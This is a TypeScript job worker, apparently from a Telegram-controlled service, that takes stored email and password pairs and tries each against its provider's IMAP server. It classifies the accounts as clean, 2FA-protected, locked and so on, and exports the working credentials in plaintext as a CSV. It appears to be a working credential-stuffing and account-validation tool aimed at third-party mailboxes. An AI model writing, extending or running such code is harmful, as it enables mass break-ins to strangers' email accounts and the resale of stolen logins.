import { Worker, Job } from "bullmq";
import IORedis from "ioredis";
import {
  redisConnection,
  type ImapValidateBatchJobData,
} from "../services/queue.js";
import { IMAPVerifier } from "../services/imap/verifier.js";
import { getImapConfig, getImapProvider } from "../services/imap/host-resolver.js";
import { getDomainGroup } from "../services/domain-groups.js";
import { db } from "../services/db.js";
import { notifyTaskCompleted } from "../services/notify.js";
import { updateTaskStatus } from "../services/telegram/task-tracker.js";
import { ProgressPusher } from "../services/telegram/progress-pusher.js";
import { renderProgressBar } from "../services/progress.js";
import { config } from "../config.js";
import { log, error } from "../utils/logger.js";

const BATCH_SIZE = 20;

interface StatusCounts {
  active_clean: number;
  active_with_2fa: number;
  suspicious_activity: number;
  restricted: number;
  locked: number;
  unknown_provider: number;
}

async function processImapValidateBatch(job: Job<ImapValidateBatchJobData>) {
  const { taskId, filter } = job.data;
  const redis = new IORedis(config.redis.url);
  const progressKey = `imap-validate-progress:${taskId}`;

  try {
    const pusher = new ProgressPusher(taskId, "validate");
    await pusher.init();

    await db.task.update({
      where: { id: taskId },
      data: { status: "PROCESSING" },
    });

    const totalEmails = await db.email.count({
      where: { taskId, status: "MX_FOUND", password: { not: null } },
    });

    if (totalEmails === 0) {
      await db.task.update({
        where: { id: taskId },
        data: { status: "COMPLETED", finishedAt: new Date() },
      });
      return { processed: 0 };
    }

    const verifier = new IMAPVerifier(30_000);
    let processed = 0;
    const counts: StatusCounts = {
      active_clean: 0,
      active_with_2fa: 0,
      suspicious_activity: 0,
      restricted: 0,
      locked: 0,
      unknown_provider: 0,
    };

    const results: Array<{
      email: string;
      password: string;
      status: string;
      provider: string;
    }> = [];

    while (processed < totalEmails) {
      const fresh = await db.task.findUnique({ where: { id: taskId } });
      if (fresh?.status === "PAUSED" || fresh?.status === "CANCELLED") break;

      const batch = await db.email.findMany({
        where: { taskId, status: "MX_FOUND", password: { not: null } },
        take: BATCH_SIZE,
      });

      if (batch.length === 0) break;

      for (const record of batch) {
        const imapConfig = getImapConfig(record.email);
        const provider = getImapProvider(record.email);
        let accountStatus = "locked";

        if (!imapConfig) {
          counts.unknown_provider++;
          accountStatus = "unknown_provider";
        } else {
          try {
            const result = await verifier.tryAuthenticateWithStatus(
              {
                host: imapConfig.host,
                port: imapConfig.port,
                user: record.email,
                password: record.password!,
                tls: true,
              },
              5,
            );

            accountStatus = result.accountStatus?.status ?? "locked";

            if (accountStatus in counts) {
              counts[accountStatus as keyof StatusCounts]++;
            }
          } catch {
            counts.locked++;
          }
        }

        await db.email.update({
          where: { id: record.id },
          data: {
            status: "PROCESSED",
            errorReason:
              accountStatus !== "active_clean" && accountStatus !== "active_with_2fa"
                ? `imap:${accountStatus}`
                : null,
            processedAt: new Date(),
          },
        });

        results.push({
          email: record.email,
          password: record.password ?? "",
          status: accountStatus,
          provider,
        });

        processed++;
      }

      await db.task.update({
        where: { id: taskId },
        data: { processedRows: processed },
      });

      await redis.set(progressKey, JSON.stringify(counts), "EX", 86400);
      await job.updateProgress(Math.round((processed / totalEmails) * 100));

      await pusher.pushProgress(
        `⏳ <b>IMAP валидация #${taskId}</b>\n\n` +
          renderProgressBar(processed, totalEmails) +
          `\nОбработано: ${processed} / ${totalEmails}\n` +
          `Clean: ${counts.active_clean} | 2FA: ${counts.active_with_2fa} | Locked: ${counts.locked}`,
      );
    }

    // Build filtered CSV
    const exportFilter = filter ?? "all";
    const filteredResults = results.filter((r) => {
      if (exportFilter === "clean") return r.status === "active_clean";
      if (exportFilter === "2fa") return r.status === "active_with_2fa";
      return r.status === "active_clean" || r.status === "active_with_2fa";
    });

    const csvLines = ["email,password,status,provider"];
    for (const r of filteredResults) {
      csvLines.push(
        [r.email, r.password, r.status, r.provider]
          .map((f) => `"${f.replace(/"/g, '""')}"`)
          .join(","),
      );
    }

    await redis.set(
      `imap-validate-result:${taskId}`,
      csvLines.join("\n"),
      "EX",
      86400,
    );

    // Build report text
    const total = processed;
    const reportText =
      `📊 IMAP Валидация #${taskId}\n\n` +
      `Проверено: ${total}\n` +
      `Active Clean:     ${counts.active_clean} (${total > 0 ? Math.round((counts.active_clean / total) * 100) : 0}%)\n` +
      `Active 2FA:       ${counts.active_with_2fa} (${total > 0 ? Math.round((counts.active_with_2fa / total) * 100) : 0}%)\n` +
      `Suspicious:       ${counts.suspicious_activity} (${total > 0 ? Math.round((counts.suspicious_activity / total) * 100) : 0}%)\n` +
      `Restricted:       ${counts.restricted} (${total > 0 ? Math.round((counts.restricted / total) * 100) : 0}%)\n` +
      `Locked:           ${counts.locked} (${total > 0 ? Math.round((counts.locked / total) * 100) : 0}%)\n` +
      `Unknown Provider: ${counts.unknown_provider}\n\n` +
      `Валидных для экспорта: ${filteredResults.length}`;

    await redis.set(
      `imap-validate-report:${taskId}`,
      reportText,
      "EX",
      86400,
    );

    const fresh = await db.task.findUnique({ where: { id: taskId } });
    if (fresh?.status === "CANCELLED") {
      await pusher.pushCancelled();
      return { processed, counts, exported: 0 };
    }

    await db.task.update({
      where: { id: taskId },
      data: {
        status: "COMPLETED",
        validCount: counts.active_clean + counts.active_with_2fa,
        invalidCount: counts.locked + counts.restricted + counts.suspicious_activity,
        errorCount: counts.unknown_provider,
        processedRows: processed,
        finishedAt: new Date(),
      },
    });

    await pusher.pushFinalResult(
      `✅ <b>IMAP валидация #${taskId} завершена</b>\n\n` +
        `Проверено: ${processed}\n` +
        `Clean: ${counts.active_clean} | 2FA: ${counts.active_with_2fa}\n` +
        `Locked: ${counts.locked} | Suspicious: ${counts.suspicious_activity}\n` +
        `Экспорт: ${filteredResults.length} записей`,
    );

    if (job.data.chatId) {
      await updateTaskStatus(taskId, BigInt(job.data.chatId), "completed").catch(
        () => {},
      );
    }

    await notifyTaskCompleted(taskId);

    return { processed, counts, exported: filteredResults.length };
  } finally {
    redis.disconnect();
  }
}

export function createImapValidateBatchWorker() {
  const worker = new Worker<ImapValidateBatchJobData>(
    "imap-validate-batch",
    processImapValidateBatch,
    { connection: redisConnection, concurrency: 1 },
  );

  worker.on("completed", (job) =>
    log(`IMAP validate batch job ${job.id}: completed`),
  );
  worker.on("failed", (job, err) =>
    error(`IMAP validate batch job ${job?.id}: failed — ${err.message}`),
  );

  return worker;
}
